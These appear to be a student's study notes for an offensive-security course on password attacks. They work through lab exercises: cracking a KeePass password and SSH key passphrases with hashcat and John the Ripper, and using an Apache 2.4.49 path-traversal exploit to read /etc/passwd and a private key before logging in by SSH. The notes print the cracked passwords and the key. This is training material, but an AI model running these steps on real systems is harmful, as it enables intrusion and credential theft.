+* Bytes.....: 139921507.
+* Keyspace..: 430331550000.
+
+$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56:pinkpanther1234
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
+Hash.Target......: $keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2...cf4b56
+Time.Started.....: Sun Oct  1 11:17:20 2023, (0 secs)
+Time.Estimated...: Sun Oct  1 11:17:20 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/rockyou-30000.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1261.9 kH/s (1.59ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 401408/430331550000 (0.00%)
+Rejected.........: 0/401408 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:48-49 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 1234561234 -> whitetiger1234
+Hardware.Mon.#1..: Temp: 51c Util: 34%
+
+Started: Sun Oct  1 11:17:19 2023
+Stopped: Sun Oct  1 11:17:22 2023
+
+
+### Recovered master password pinkpanther1234
+### Login into KeePass with master password and retrieve flag.
+
+eSGJIzUp5nrr834QZBWK
+```
+
+
+
+### SSH Private Key Passphrases
+
+In this section we focus on cracking SSH private key passphrases.  Although, SSH private keys should be kept secured there are many instances where these files may become compromised.  If we were to gain access to a web application via directory traversal, we can read files on the system, in turn allowing us to retrieve a user's private SSH key.  If we attempt to connect to the system and are prompted to enter a passphrase, we will need to crack it!
+
+Using the cracking methodology we discussed previously, we will crack the passphrase of a private key.  When we used a dict attack to gain access on the HTTP BRUTE login form, we gained access to a file manager hosting an SSH private key.
+
+Let's browse another web service for this demo, VM1, and log in with user:121212.  Similar to the previous TinyFileManager example, but the main dir now contains 2 files:
+- `id_rsa`
+- `notes.txt`
+Download both to our attacking machine.  First, review the `notes.txt`.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat note.txt 
+Dave's password list:
+
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+
+Note to myself:
+New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
+```
+- Great, we have Dave's password list in cleartext (convenient)
+	- *This would be a rare case IRL*
+- Attempt to use the `id_rsa` on the newly ID'd user `dave`
+	- First set the perms of the downloaded `id_rsa`
+	- SSH port for this example is `2222`
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ chmod 600 id_rsa         
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ ssh -i id_rsa -p 2222 -o PubKeyAuthentication=no dave@$VM1   
+The authenticity of host '[192.168.235.201]:2222 ([192.168.235.201]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:SxEapuin3GJsdhOqDdFrm+ncv8/8UU+a8npW7OKfREk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.235.201]:2222' (ED25519) to the list of known hosts.
+dave@192.168.235.201's password: 
+Permission denied, please try again.
+dave@192.168.235.201's password: 
+Permission denied, please try again.
+dave@192.168.235.201's password: 
+dave@192.168.235.201: Permission denied (publickey,password,keyboard-interactive).
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ ssh -i id_rsa -p 2222 -o PubKeyAuthentication=no dave@$VM1
+dave@192.168.235.201's password: 
+Permission denied, please try again.
+dave@192.168.235.201's password: 
+Permission denied, please try again.
+dave@192.168.235.201's password: 
+dave@192.168.235.201: Permission denied (publickey,password,keyboard-interactive).
+```
+- no joy
+	- IRL we would use these password for spray attacks or gainst user `dave` on other systems
+- going by the notes, it is likely `dave` has chaned his password to comply with new policy.
+
+Following cracking methodology, our next step is to convert the private key into a hash format compatible with our tools.
+```bash
+ ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ ssh2john id_rsa > ssh.hash                                
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat ssh.hash                     
+id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682d727361000000030100010000018100efae6dfe87157683772695bba9daf5f40bff961ed5d329a2706a68fa2b704b0718c1464e60d07cc7d39b546f9a89642a36b0536276cfbb06f3b9349f3d7fdfb54d2c21f0a42f87374c7750971ba305931e11a5a9f6ee014a1cee399a5f58fe9e49f31bef98b3aee67c0259b057d5df23936aac7b5e34753dc5c04d4d29c63d49eb02b7d3320e78d391fa80de248d76f10bc1cffd9b27c14b17555b0213ffb4ba83b255e85dc9c9529a3d9952f780e9e11a8ede456968109253e46434cc88f3e3beb7e0b4e6e05ff625628a0057f1cf06316437e6d272d8b285cc6e2832c715ddfc7edfe82a5fc7a61b1b07666003f711cfb5707747eb2389a28b212491cf8e1acb183dd3dd2a0f6f2667f14feb1f10da2c7d1d85a871b573826dc4db2e20d51be5cf55bdcf1384455aca7e3cd274fcb12b1b3a87e2e804e07e4c904ba2220fccb0a8ff829944a51f1ca7c4097256496f89174160ed831f2c4f21e411252f8fb9112deba4c3089ba2983b49d703e7f6bfbbc2b3626964dccd2e51349ec8e4949f0000058018795357c0b4addcc14f32a4c3e90627de0a9cd99324dd0c09daa1aee656a529ec384f6c92eae832807254104104279316076d781e86bf747b37e43ba8606bc1b851c2d0e97d866f48d800e40e741a7c26096b08a7dc2ea5f3b2c891d565d8b6de13c2caa1604d1f44c0bd2bdae221835ec6f7ae3477b179bb8be7ac2a54347eebc2af15636f99fc8b4c454f3c7bf2af9a35acc852d40b5156cb1cd1d30422ba1b766ad4eaec5a0b92e8978c67dc8671d448289a1f39aa156b308b6985bd92bc261eebe10d8537f68bc7645a76242d25c86bf3284de3c803a460b7851c317fdf683bfa52b51f67fccfd14bc34f7e2d9c3a4241204cd183dd34e97f135ccb1e2dab85a864a61cb4618934fa89abd356a0511e7514762e214685d54e42b51abb2a9c94ee037a71da0a42722ad9eb432ab1bf985f5a01d0afa74b370e8d8c85f4d7fdc6bcaad833f508542b3bf3c4a589c8bd5e0ad93b07c7a7c29b5a7b3c41ebb79cb750b15e6331d10d43ee16b3e7258291dcb4297d34cca6e24ba494a21465152112baba1ced9039f6c288395497cca41954dbb3858e13548768998419a9c1fe5089ba18e44b65e72efd40c3394111d2798219063d685f8d5f89cac8f0955bb244019238615ebf438d1adf88c80481aa62a8a9e6c19f4ac4931ab33d0b33d999fb69a8bd725c9feb0110a67d152edbb3435a4cac029c4876b2da87a27070a39cef510706986871649241a7a9731a3a732fa0cbbf468a9da9af4670432d269d1aa334882a0e49d0c5a52f6bae655bcea2b9d39ac30e1f0c30707dd957d98c4a5f757a3ba6667761ccc736ed9b3a2d7f91c784f61a25d8ed70d6e91a7518f2fb379b0bb39cf7881a60498a9b96690d1a45d29d74d54004fc10b9f6b777ac812fb7ee4f9a74f540134870f2865d90dbde765349e0b696b56b31f8a90033029bfb6a5cc927dc3629d867a95bcf95698f4cfcebbccda7e75f1e016500c7738d38ab0a0074ee3e8b29986b2fac8251fa26db3248cff96afd5e32112da221be9aaba7ac9e8d9547cd90bb1e8b1e3594d87c96b4cff829a2d1f850f222a9b7b4bd845e4a43911f7577611536a60824fe4db5ded1e180f350cb978f5fc729c35d1b9221cb0c236178c79e90897d96a0e470406e9dc6fd93c567e89f7a6e5d037e8dcff0746a3a47f5ca41cfa8f4e028edc531695a4d165749bd57413d893c31164d304a4ec68ac15c6502b74d16b34e41a66611f2e61d0cd00e67a18e496ad8a11cf12ac1b6bed55e26112b2c9ec7ef4962c0e01e8d472b9387759b2ba2fab1ef865a6971d6f9e49c119bc4390e68ef0dd877419e9a7f2c5332656de9f3186e6f1e97ab4a0f91872ada83050d9db3e312c795890b417293bb9a151e34e05d9f4334e6794e91704e71763f2bdc0e21bf0f5dacbcd77914f6de4c70884e67f2461010bee568cf77ce32c32f5533d6d8a3e790e10f593e6bb778b027a1ed7698d1df545411b66c2027809f005e6ae036ec83e7c337a3c2eddaf967e195b464e18d6807123ed94aaf28431f7b2c62310acaf3893dc9b0d6b21e6baa6683302b8b3a311d658564525f395f882fd4d57e2232dc706c12b3354801c8a9886f1b52b17b11677d1c86d6cc037a51d7da28c8204e6e9978482a4fa816a3aeea492adc388d8f2b2f906a955e019dc178c4be6a6c06fdbbfb0084ca68ce786db4c2e9b00b4a4f842ae73c29c5581dbd1ffcbe0e4fddac5179465974e665c3ba2a4fdf1ef5aebb271f385c5a267cb5686fe1539296ea53b292cc70a04b048c99b91640d5b0f93df0817cef28d2ea1d04df2e09dab65d8660745b8248bb9c6b13de2d36f054db2897b33a194e10f0a492f3eaae1c7b73759594e3f1a5808f941e882d19f3beec856c7db925b515c76f648ab256f6f21fe61cce53bbf393c867ef8c8adf4e93cfd23dfb89408462fb60e97b910a69740ee952743d679017a32cfeadfb412288b183df308632$16$486
+```
+- In the output
+	- `$6$` signifies `SHA-512`
+	- as previously done, we need to remove the filename before the first `:`
+- Then we determine the correct Hashcat mode
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ nano ssh.hash     
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat --help | grep -i "ssh"                                            
+   6700 | AIX {ssha1}                                                | Operating System
+   6400 | AIX {ssha256}                                              | Operating System
+   6500 | AIX {ssha512}                                              | Operating System
+   1411 | SSHA-256(Base64), LDAP {SSHA256}                           | FTP, HTTP, SMTP, LDAP Server
+   1711 | SSHA-512(Base64), LDAP {SSHA512}                           | FTP, HTTP, SMTP, LDAP Server
+    111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA                | FTP, HTTP, SMTP, LDAP Server
+  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                        | Enterprise Application Software (EAS)
+  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)                      | Private Key
+  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
+  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)                  | Private Key
+  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)                      | Private Key
+  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)                      | Private Key
+```
+- output shows that mode of `$6$` is `22921`
+
+Next we must prepare our rule file to comply with policy we discovered.
+ ```
+ Note to myself:
+New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
+```
+- Notice that `dave` used `137` for the 3 numbers in `rickc137`
+- The `Window` password starts with an upper case char
+- Create a rule function
+	- upper case first char
+	- as dave has no special char in any know passwords we will use the most common `!@#`
+	- we will also use num `137` based on our observations
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat ssh.rule 
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+```
+- next we create a wordlist file containing the known passwords
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ nano ssh.passwords
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat ssh.passwords 
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+```
+- We perform our first cracking attempt
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force               
+hashcat (v6.2.6) starting
+
+...
+Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
+```
+- However we recieve a token len exception
+	- a Google search reveals that the modern private keys and passphrases are created with the aes-256-ctr cipher, which is unsupported by Hashcat mode `22921`
+	- JtR can handle this cipher
+
+To use the rules we created with JtR we need to add a name for the rules and append them to `/etc/john/john.conf` file.
+- we will use the name `sshRules`
+	- with `List.Rules` naming sytax show below
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat ssh.rule     
+[List.Rules:sshRules]
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ sudo sh -c 'cat /home/operator/OffSec/password-attacks/ssh.rule >> /etc/john/john.conf'
+```
+
+We can now use `john` to crack the passphrase as the final step of our methodology!
+- In our `john` command
+	- define wordlist with `--wordlist=ssh.passwords`
+	- rules with `--rules=sshRules`
+		- as appended to john conf
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash           
+Created directory: /home/operator/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Umbrella137!     (?)     
+1g 0:00:00:00 DONE (2023-10-01 12:01) 1.538g/s 27.69p/s 27.69c/s 27.69C/s Window137!..Umbrella137#
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+- We successfully crack passphrase `Umbrella137!`
+	- the passphrase complies with policy but also matches dave's personal prefs
+	- users rarely change their password patterns
+
+Now we can use the passphrase to connect to the target system via SSH. (Note: created ssh config entry to specify id_rsa of this connection)
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ ssh dave-ssh                                   
+Enter passphrase for key '/home/operator/OffSec/password-attacks/id_rsa': 
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <http://wiki.alpinelinux.org/>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+8df1e0139a6f:~$
+```
+
+We have succeeded in connecting to the target system by following the methodology and applying our understanding of human behavioral patterns!  We adapted to an error in our main tool, Hashcat, by using JtR.
+
+#### Exercises
+
+Enumerate VM #2 and find a way to get access to SSH on port 2222. Find the flag of the user you used for the SSH connection. You can use the same rules we created in this section.
+```
+### Enumerate VM2
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ export VM2='192.168.235.201'
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ sudo nmap -sS -T 5 -p 1-10000 $VM2
+[sudo] password for operator: 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-01 12:21 PDT
+Warning: 192.168.235.201 giving up on port because retransmission cap hit (2).
+Nmap scan report for 192.168.235.201
+Host is up (0.075s latency).
+Not shown: 9997 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Nmap done: 1 IP address (1 host up) scanned in 23.98 seconds
+
+
+### Browse the web app on 80
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ google-chrome http://$VM2:80  
+Opening in existing browser session.
+
+### Site currently unavailable landing page, inspected page source and found username.
+
+<!-- While we are rebuilding only alfred has access to the server -->
+
+
+### Username alfred
+### Attempted password spray and mutation of rockyou.txt subset
+### performed further enumeration
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ sudo nmap -sV -p 22,80,2222 $VM2     
+[sudo] password for operator: 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-01 12:47 PDT
+Nmap scan report for 192.168.235.201
+Host is up (0.078s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.49 ((Unix))
+2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.39 seconds
+
+
+### Possible path traversal vuln on Apache
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ searchsploit 'Apache httpd 2.4'
+------------------------------------------------------- ---------------------------------
+ Exploit Title                                         |  Path
+------------------------------------------------------- ---------------------------------
+Apache 2.4.23 mod_http2 - Denial of Service            | linux/dos/40909.py
+Apache HTTP Server 2.4.49 - Path Traversal & Remote Co | multiple/webapps/50383.sh
+------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+### Review and test exploit
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ bash 50383.sh
+Set [TAGET-LIST.TXT] [PATH] [COMMAND]
+./PoC.sh targets.txt /etc/passwd
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo "http://$VM2" > pathtrav-vm2.txt
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat pathtrav-vm2.txt 
+http://192.168.235.201
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ bash 50383.sh pathtrav-vm2.txt /etc/passwd
+http://192.168.235.201
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+alfred:x:1000:1000::/home/alfred:/bin/bash
+
+
+### Great, get the private key!!!
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ bash 50383.sh pathtrav-vm2.txt /home/alfred/.ssh/id_rsa 
+http://192.168.235.201
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+tG9DRw==
+-----END OPENSSH PRIVATE KEY-----
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ ls id_rsa                  
+id_rsa
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ mv id_rsa id_rsa.vm1                            
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ nano id_rsa  
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ chmod 600 id_rsa    
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ ssh2john id_rsa > vm2.hash
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ nano vm2.hash
+
+
+### Prepared the hash for cracking
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules vm2.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Superstar137!    (?)     
+1g 0:00:00:08 DONE (2023-10-01 13:00) 0.1165g/s 44.75p/s 44.75c/s 44.75C/s Smokey137!..Michael1137!
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+
+### Using the rules we created earlier and rockyou.txt we crack the passphrase
+
+alfred:Superstar137!
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ ssh alfred-ssh                                                                
+The authenticity of host '[192.168.235.201]:2222 ([192.168.235.201]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:cGn2rSHr9HqtE5C/hcJARY6gQt2mW9OtbpXNI5UjLLE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.235.201]:2222' (ED25519) to the list of known hosts.
+Enter passphrase for key '/home/operator/OffSec/password-attacks/id_rsa': 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-50-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com.
+ * Management:     https://landscape.canonical.com.
+ * Support:        https://ubuntu.com/advantage.
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+alfred@590db90b12bd:~$ ls
+123_flag.txt
+alfred@590db90b12bd:~$ cat 123_flag.txt 
+OS{561dea7cf395e2033cb0723c7b33c7a5}
+```
+
+
+## 15.3 Working with Password Hashes
+
+- Obtain and crack NTLM hashes
+- Pass NTLM hashes
+- Obtain and crack Net-NTLMv2 hashes
+- Relay Net-NTLMv2 hashes
+
+*While in most assignments we'll face an Active Directory environment, this Learning Unit only covers local Windows machines. However, the skills learned here are a stepping stone to the later Active Directory Modules in this course.*
+
+For this, we'll cover two different hash implementations on Windows: 
+- [NT LAN Manager (NTLM)](https://en.wikipedia.org/wiki/NT_LAN_Manager)
+- [Net-NTLMv2.4](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3)
+
+
+### Cracking NTLM
+
+Windows stores hased user passwords in the [Security Account Manager (SAM)](https://en.wikipedia.org/wiki/Security_Account_Manager) DB file, used to auth local and remote accounts.
+
+*To deter offline SAM database password attacks, Microsoft introduced the SYSKEY feature in Windows NT 4.0 SP3, which partially encrypts the SAM file. The passwords can be stored in two different hash formats: LAN Manager (LM)2 and NTLM. LM is based on DES,3 and is known to be very weak. For example, passwords are case insensitive and cannot exceed fourteen characters. If a password exceeds seven characters, it is split into two strings, each hashed separately. LM is disabled by default beginning with Windows Vista and Windows Server 2008.*
+
+On modern systems, the SAM hashes are stored as NTLM.  This hash fixes many of the weaknesses of LM, i.e. passwords are case sensitive and no longer split into smaller, weaker, hashes.  However, NTLM hashes stored in the SAM DB are not salted.
+
+[Salts](https://en.wikipedia.org/wiki/Salt_(cryptography)) are random buts appended to a password *before* it is hashed.  They are used to prevent an attack in which attackers pre-compute a list of hashes and then perform lookups on these precomputed hashes to infer the plaintext password.  A list or table of precomputed passwords is called a [Rainbow Table](https://en.wikipedia.org/wiki/Rainbow_table), the attack is known as a Rainbow Table Attack.
+
+*We use "NTLM hash" to refer to the formally correct NTHash. Since "NTLM hash" is more commonly used in our industry, we use it in this course to avoid confusion.*
+
+We cannot perform operations on the SAM DB (copy/rename/move) in **C:\Windows\system32\config\sam** while Win is running, the kernel keeps and exclusive file system lock on it.  However, this restriction can be bypassed with a [Mimikatz](https://github.com/gentilkiwi/mimikatz).
+
